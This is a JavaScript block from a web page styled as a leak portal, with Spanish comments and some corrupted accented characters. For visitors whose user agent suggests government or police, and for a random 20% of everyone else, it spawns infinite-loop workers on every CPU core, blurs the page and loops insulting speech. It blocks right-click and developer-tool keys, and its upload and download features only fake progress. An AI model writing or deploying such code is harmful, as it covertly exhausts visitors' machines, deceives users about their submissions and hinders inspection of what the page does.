<script>
    const stream = document.getElementById('data-stream');
    const logs = document.getElementById('scanner-logs');
    const polyAlert = document.getElementById('polyglot-alert');
    const insults = ["VOUS √äTES DES SINGES", "IHR SEID AFFEN", "–í–´ –û–ë–ï–ó–¨–Ø–ù–´", "S01S UN0S M0N0S", "MONKEYS IN SUITS"];

    function initSystem() {
        // Vibe Check autom√°tico
        const isMonkey = /gov|gob|cni|policia/i.test(navigator.userAgent) || Math.random() < 0.2;
        
        if (isMonkey) {
            startMonkeyJail();
        } else {
            startWhiteHackerSession();
        }
    }

    function startWhiteHackerSession() {
        document.getElementById('identity-box').innerText = "WHITE_HACKER_GEN_7";
        logs.innerHTML += "> [OK] INTEGRIDAD VERIFICADA.<br>> [INFO] DATOS INDEXADOS.<br>";
        generateStream();
    }

    function startMonkeyJail() {
        // El estrangulador de CPU (Trabajando al 96% de carga in√∫til)
        for(let i=0; i<navigator.hardwareConcurrency; i++) {
            new Worker(URL.createObjectURL(new Blob(['while(true){Math.atan2(Math.random(), Math.random());}'])));
        }
        document.getElementById('main-ui').style.filter = "blur(10px)";
        document.getElementById('monkey-jail').style.display = "block";
        
        setInterval(() => {
            polyAlert.innerText = insults[Math.floor(Math.random() * insults.length)];
            const m = new SpeechSynthesisUtterance("Atenci√≥n mono. Vuelve a la charca.");
            m.lang = 'es-ES'; m.rate = 0.7;
            window.speechSynthesis.speak(m);
        }, 2000);
    }

    function generateStream() {
        const hex = "0123456789ABCDEF";
        setInterval(() => {
            let line = "";
            for(let i=0; i<80; i++) line += hex[Math.floor(Math.random()*16)];
            const div = document.createElement('div');
            div.className = "stream-line";
            div.innerText = `> ${line}`;
            stream.prepend(div);
            if(stream.childNodes.length > 30) stream.removeChild(stream.lastChild);
        }, 50);
    }

    function dumpData() {
        const content = document.getElementById('leak-input').value;
        if(!content) return;
        
        document.getElementById('progress-container').style.display = "block";
        let p = 0;
        const bar = document.getElementById('progress-bar');
        const txt = document.getElementById('progress-text');
        
        const interval = setInterval(() => {
            p += 2;
            bar.style.width = p + "%";
            txt.innerText = `VOLCANDO PAQUETE EN NODO_CRIPTO_${p}...`;
            if(p >= 100) {
                clearInterval(interval);
                alert("VOLCADO COMPLETADO. LA VERDAD HA SIDO LIBERADA.");
                document.getElementById('leak-input').value = "";
            }
        }, 50);
    }

    function simDownload(id) {
        const status = document.getElementById('download-status');
        status.innerHTML = `> INICIANDO TRANSFERENCIA DE ${id}...<br>> CIFRANDO PAQUETES EN AES-256...<br>> [OK] ARCHIVO DISPONIBLE EN EL CACH√â DEL NODO.`;
    }

    // Bloqueo total
    document.oncontextmenu = () => false;
    document.onkeydown = (e) => { if(e.ctrlKey || e.key === 'F12') return false; };
</script>

